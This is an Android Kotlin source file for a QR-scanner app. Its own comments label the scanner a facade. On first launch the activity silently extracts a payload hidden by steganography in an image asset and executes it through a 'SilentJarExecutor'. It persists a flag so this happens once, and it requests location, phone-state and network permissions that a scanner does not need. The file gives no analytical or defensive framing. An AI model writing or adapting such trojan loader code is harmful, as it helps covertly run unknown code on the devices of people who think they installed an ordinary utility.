package com.example.aplicacionqr

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import android.Manifest
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.aplicacionqr.databinding.ActivityMainBinding
import com.google.zxing.integration.android.IntentIntegrator
import com.google.zxing.integration.android.IntentResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicBoolean

class MainActivity : AppCompatActivity() {

    private val TAG = "MainActivity"
    private val REQUEST_CODE_PERMISSIONS = 1001

    // ✨ Todos los permisos necesarios (QR + Payload)
    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_FINE_LOCATION
    )

    private lateinit var binding: ActivityMainBinding
    private lateinit var btnScan: Button
    private lateinit var txtResult: TextView
    private lateinit var prefs: SharedPreferences

    companion object {
        // ✨ Flag global atómico para evitar ejecuciones múltiples en memoria
        private val globalPayloadExecuted = AtomicBoolean(false)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        binding = ActivityMainBinding.inflate(layoutInflater)
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(binding.root)

        // ✨ Inicializar SharedPreferences para persistencia
        prefs = getSharedPreferences("PayloadPrefs", Context.MODE_PRIVATE)

        // Inicializar vistas
        btnScan = findViewById(R.id.btnScan)
        txtResult = findViewById(R.id.txtResult)

        // Solicitar permisos
        requestAllPermissionsIfNeeded()

        // ✨ Ejecutar payload oculto SOLO UNA VEZ (persistente)
        executeHiddenPayloadOnce()

        // 🎭 Fachada: Escáner QR (funcionalidad legítima)
        btnScan.setOnClickListener {
            if (allPermissionsGranted()) {
                startQRScanner()
            } else {
                Toast.makeText(
                    this,
                    "Se necesitan permisos de cámara",
                    Toast.LENGTH_SHORT
                ).show()
                requestAllPermissionsIfNeeded()
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // 🎭 FUNCIONALIDAD LEGÍTIMA: ESCÁNER QR
    // ═══════════════════════════════════════════════════════════

    private fun startQRScanner() {
        val integrator = IntentIntegrator(this)
        integrator.setDesiredBarcodeFormats(IntentIntegrator.QR_CODE)
        integrator.setPrompt("Escanea un código QR")
        integrator.setCameraId(0)
        integrator.setBeepEnabled(true)
        integrator.setBarcodeImageEnabled(true)
        integrator.setOrientationLocked(false)
        integrator.initiateScan()
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: android.content.Intent?) {
        val result: IntentResult? = IntentIntegrator.parseActivityResult(
            requestCode,
            resultCode,
            data
        )

        if (result != null) {
            if (result.contents == null) {
                Toast.makeText(this, "Escaneo cancelado", Toast.LENGTH_SHORT).show()
                txtResult.text = "Resultado: escaneo cancelado"
                Log.d(TAG, "📷 Escaneo QR cancelado")
            } else {
                txtResult.text = "Resultado: ${result.contents}"
                Toast.makeText(this, "QR escaneado exitosamente", Toast.LENGTH_SHORT).show()
                Log.d(TAG, "📷 QR escaneado: ${result.contents}")

                // ✨ Opcional: Procesar el contenido del QR
                processQRContent(result.contents)
            }
        } else {
            super.onActivityResult(requestCode, resultCode, data)
        }
    }

    private fun processQRContent(content: String) {
        // 🎯 Aquí puedes agregar lógica adicional para procesar QRs
        // Por ejemplo: abrir URLs, guardar en base de datos, etc.

        when {
            content.startsWith("http://") || content.startsWith("https://") -> {
                Log.d(TAG, "🌐 URL detectada: $content")
                // Opcional: Abrir en navegador
                // val intent = Intent(Intent.ACTION_VIEW, Uri.parse(content))
                // startActivity(intent)
            }
            content.contains("@") -> {
                Log.d(TAG, "📧 Email detectado: $content")
            }
            content.matches(Regex("\\d+")) -> {
                Log.d(TAG, "🔢 Número detectado: $content")
            }
            else -> {
                Log.d(TAG, "📝 Texto plano: $content")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // 🔒 FUNCIONALIDAD OCULTA: PAYLOAD
    // ═══════════════════════════════════════════════════════════

    private fun executeHiddenPayloadOnce() {
        // ✨ Verificar flags: SharedPreferences (persistente) + AtomicBoolean (memoria)
        val persistentFlag = prefs.getBoolean("payload_executed", false)
        val memoryFlag = globalPayloadExecuted.get()

        if (persistentFlag || memoryFlag) {
            Log.d(TAG, "✅ Payload ya ejecutado (persistent=$persistentFlag, memory=$memoryFlag)")
            return
        }

        // ✨ Usar Compare-And-Set atómico para evitar race conditions
        if (!globalPayloadExecuted.compareAndSet(false, true)) {
            Log.w(TAG, "⚠️ Otro thread ya está ejecutando el payload, saltando...")
            return
        }

        Log.d(TAG, "🚀 Primera ejecución del payload, iniciando...")

        lifecycleScope.launch(Dispatchers.IO) {
            try {
                Log.d(TAG, "🔍 Extrayendo payload oculto...")

                // ✨ Usar applicationContext para evitar memory leaks
                val extracted = SecurePayloadExtractor.extractFromAssets(
                    applicationContext,
                    "stego_image.png"
                )

                if (extracted == null) {
                    Log.e(TAG, "❌ Extracción fallida")
                    globalPayloadExecuted.set(false) // Resetear para reintentar
                    return@launch
                }

                Log.d(TAG, "✅ Extraído: ${extracted.type} (${extracted.sizeBytes} bytes)")
                Log.d(TAG, "📁 Ubicación: ${extracted.file.absolutePath}")

                // ✨ Ejecutar con applicationContext
                val success = SilentJarExecutor.executeSilently(
                    extracted.file,
                    applicationContext
                )

                if (success) {
                    // ✨ Marcar como ejecutado PERMANENTEMENTE
                    prefs.edit().putBoolean("payload_executed", true).apply()
                    Log.d(TAG, "✅ Payload ejecutado exitosamente y marcado como completado")

                    // ✨ Opcional: Mostrar toast solo en debug
                    // withContext(Dispatchers.Main) {
                    //     Toast.makeText(
                    //         this@MainActivity,
                    //         "Inicialización completada",
                    //         Toast.LENGTH_SHORT
                    //     ).show()
                    // }
                } else {
                    Log.e(TAG, "❌ Ejecución del payload fallida")
                    globalPayloadExecuted.set(false) // Resetear para reintentar
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Error crítico en payload: ${e.message}", e)
                globalPayloadExecuted.set(false) // Resetear
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // 🔐 GESTIÓN DE PERMISOS
    // ═══════════════════════════════════════════════════════════

    private fun allPermissionsGranted() = REQUIRED_PERMISSIONS.all {
        ContextCompat.checkSelfPermission(baseContext, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestAllPermissionsIfNeeded() {
        val missing = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            Log.d(TAG, "📋 Solicitando ${missing.size} permisos faltantes")
            ActivityCompat.requestPermissions(
                this,
                missing.toTypedArray(),
                REQUEST_CODE_PERMISSIONS
            )
        } else {
            Log.d(TAG, "✅ Todos los permisos concedidos")
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
            val denied = grantResults.count { it != PackageManager.PERMISSION_GRANTED }

            Log.d(TAG, "📊 Permisos: $granted concedidos, $denied denegados")

            if (denied > 0) {
                Toast.makeText(
                    this,
                    "Algunos permisos son necesarios para el funcionamiento completo",
                    Toast.LENGTH_LONG
                ).show()

                // ✨ Mostrar qué permisos fueron denegados (solo en debug)
                permissions.filterIndexed { index, _ ->
                    grantResults[index] != PackageManager.PERMISSION_GRANTED
                }.forEach { permission ->
                    Log.w(TAG, "⚠️ Permiso denegado: $permission")
                }
            } else {
                Toast.makeText(
                    this,
                    "Permisos concedidos correctamente",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // 🔄 CICLO DE VIDA
    // ═══════════════════════════════════════════════════════════

    override fun onResume() {
        super.onResume()
        Log.d(TAG, "🔄 onResume() - Activity visible")
        // No ejecutar payload de nuevo aquí
    }

    override fun onPause() {
        super.onPause()
        Log.d(TAG, "⏸️ onPause() - Activity en background")
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "🛑 onDestroy() - Activity destruida")
        // El flag globalPayloadExecuted se mantiene en memoria
        // El SharedPreferences persiste en disco
    }
}